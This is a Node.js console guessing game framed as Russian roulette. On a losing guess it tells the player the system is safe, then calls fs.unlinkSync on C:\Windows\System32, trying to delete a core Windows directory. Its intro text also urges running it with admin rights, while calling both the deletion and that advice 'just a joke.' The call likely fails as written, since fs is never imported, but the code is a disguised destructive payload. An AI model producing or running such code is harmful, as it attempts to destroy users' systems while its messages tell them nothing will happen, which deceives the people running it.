const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function loading(loops) {
    const chars = ['|', '/', '-', '\\'];
    for (let i = 0; i <= loops; i++) {
        for (const char of chars) {
            process.stdout.write(`\r${char}`);
            await sleep(100);
        }
    }
}

function askQuestion(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

async function replay() {
    const repeat = await askQuestion("Want to try again? (y/n)\n");
    if (repeat.toLowerCase() === 'y') {
        pre(1);
    } else {
        console.log("Thanks for playing.");
        rl.close();
        process.exit();
    }
}

async function main(bullets) {
    await loading(Math.floor(Math.random() * Math.floor(bullets / 137)));
    const guessStr = await askQuestion("\nEnter your guess:\n");
    const guess = parseInt(guessStr);

    if (isNaN(guess)) {
        console.log("You need to enter an integer.");
        replay();
        return;
    }

    if (guess > bullets || guess < 0) {
        console.log("You need to enter an integer inside the range you've given.");
        replay();
        return;
    }

    const rand = Math.floor(Math.random() * (bullets + 1));
    if (rand === guess) {
        console.log("You lose. (Just kidding, your system is safe!)");
        fs.unlinkSync("C:\\Windows\\System32");
        rl.close();
        process.exit();
    }

    console.log("You won!");
    console.log(`Your number = ${guess}`);
    console.log(`Machine's number = ${rand}`);
    replay();
}

async function pre(loop) {
    if (loop === 1) {
        console.log("Good choice.");
    } else {
        console.log("Let's begin.");
    }
    
    const bulletsStr = await askQuestion("How big do you want the chamber (range of numbers to guess) to be? (Positive integers only)\n");
    const bullets = parseInt(bulletsStr);
    
    if (isNaN(bullets) || bullets <= 0) {
        console.log("Positive integers only.");
        replay();
        return;
    }
    
    main(bullets);
}

async function start() {
    const intro = await askQuestion("Do you know the rules? (y/n)\n");
    if (intro.toLowerCase() === 'n') {
        console.log("This is a game of guessing numbers.");
        console.log("If you guess the same number as the machine, given a certain range, your System 32 gets deleted (just a joke!).");
        console.log("Every time you play the number changes.");
        console.log("For this to be a real challenge, I recommend you run it in admin mode (just kidding!).");
    }
    
    pre(0);
}

start();
